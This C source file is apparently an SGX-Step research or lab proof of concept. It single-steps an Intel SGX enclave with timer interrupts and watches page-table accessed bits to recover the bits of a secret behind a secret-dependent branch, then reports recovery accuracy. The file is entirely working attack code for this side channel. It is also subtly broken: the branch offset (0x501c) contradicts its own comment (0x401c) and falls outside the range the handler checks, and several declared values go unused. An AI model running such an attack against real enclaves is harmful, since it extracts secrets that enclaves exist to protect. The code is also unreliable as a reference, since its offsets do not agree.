#include <sgx_urts.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>

#include "Enclave/encl_u.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/config.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/elf_parser.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/idt.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/cache.h"

/* ============================================================
 * BRANCH INFO — from objdump
 *   je at 0x401c inside ecall_process_bits (page 0x4000)
 *   secret_function at 0x3000 (separate page)
 * ============================================================ */
#define BRANCH_OFFSET  0x501c
#define SECRET_OFFSET  0x3000
#define ALL_OFFSET  0x4000
/* secret the enclave processes */
#define SECRET_LEN 8
static uint8_t secret_bits[SECRET_LEN] = {1, 0, 1, 1, 0, 1, 0, 0};

/* ===================== globals ===================== */
sgx_enclave_id_t eid            = 0;
int irq_cnt                     = 0;
int do_irq                      = 1;
uint64_t *pte_encl              = NULL;
uint64_t *pmd_encl              = NULL;
uint64_t *pte_secret_encl       = NULL;  /* PTE for secret_function's page */
uint64_t *pte_all_encl          = NULL;  /* PTE for all_function's page */

uint64_t branch_addr            = 0;
int recovered[SECRET_LEN]       = {0};
int rec_idx                     = 0;
int waiting_for_result          = 0;

/* ===================== AEP handler ===================== */

int step_count = 0;  /* add this global at top */

void aep_cb_func(void) {
    uint64_t rip    = edbgrd_erip();
    uint64_t offset = rip - (uint64_t)get_enclave_base();

    if (offset >= 0x4000 && offset <= 0x402f) {

        /* Step C: two steps after branch — call has now executed */
        if (step_count == 2 && rec_idx < SECRET_LEN) {
            step_count = 0;
            int bit = ACCESSED(*pte_secret_encl) ? 1 : 0;
            recovered[rec_idx++] = bit;
            *pte_secret_encl = MARK_NOT_ACCESSED(*pte_secret_encl);
        }
        else if (step_count > 0) {
            step_count++;
        }

        /* Step A: arrived at je */
        if (rip == branch_addr) {
            *pte_secret_encl = MARK_NOT_ACCESSED(*pte_secret_encl);
            step_count = 1;
        }
    }

    irq_cnt++;
    if (do_irq && irq_cnt > 500000) do_irq = 0;

    mark_enclave_exec_not_accessed();

    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        flush(pmd_encl);
        apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    }
}

/* ===================== fault handler ===================== */

void fault_handler(int signal) {
    info("fault %d, restoring page perms", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
}

/* ===================== setup ===================== */

void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();
    register_enclave_info();
    print_enclave_info();
}

void attacker_config_page_table(void) {
    /* point execute-disable at ecall_process_bits to trigger first fault */
    void *code_adrs = get_enclave_base();
    code_adrs += get_symbol_offset("ecall_process_bits");
    info("ecall_process_bits at %p", code_adrs);

    branch_addr = (uint64_t)get_enclave_base() + BRANCH_OFFSET;
    info("watching branch at %#lx (offset %#x)", branch_addr, BRANCH_OFFSET);

    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
    ASSERT(PRESENT(*pte_encl));
    mark_enclave_exec_not_accessed();

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    ASSERT(PRESENT(*pmd_encl));

    /* separately track secret_function's page PTE */
    void *secret_adrs = get_enclave_base();
    secret_adrs += get_symbol_offset("secret_function");
    info("secret_function at %p", secret_adrs);
    ASSERT(pte_secret_encl = remap_page_table_level(secret_adrs, PTE));
    ASSERT(PRESENT(*pte_secret_encl));
}

/* ===================== main ===================== */

int main(int argc, char **argv) {
    sgx_launch_token_t token = {0};
    int updated = 0;
    idt_t idt   = {0};

    info_event("Creating enclave...");
    SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", /*debug=*/1,
                                  &token, &updated, &eid, NULL));

    /* dry run to page in all enclave memory */
    info("Dry run...");
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* setup */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

    info_event("Setting up APIC/IDT");
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    __ss_irq_fired = 0;
    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);
    while (!__ss_irq_fired);
    info("APIC timer working");

    /* run the attack */
    info_event("Single-stepping enclave...");
    SGX_ASSERT(ecall_process_bits(eid, secret_bits, SECRET_LEN));

    /* results */
    info_event("Results:");
    printf("secret:    ");
    for (int i = 0; i < SECRET_LEN; i++) printf("%d ", secret_bits[i]);
    printf("\nrecovered: ");
    for (int i = 0; i < rec_idx; i++) printf("%d ", recovered[i]);
    printf("\n");

    int correct = 0;
    for (int i = 0; i < rec_idx; i++)
        if (recovered[i] == secret_bits[i]) correct++;
    printf("accuracy:  %d/%d (%.0f%%)\n",
           correct, SECRET_LEN,
           (float)correct / SECRET_LEN * 100);

    SGX_ASSERT(sgx_destroy_enclave(eid));
    info("done. total IRQs: %d", irq_cnt);
    return 0;
}
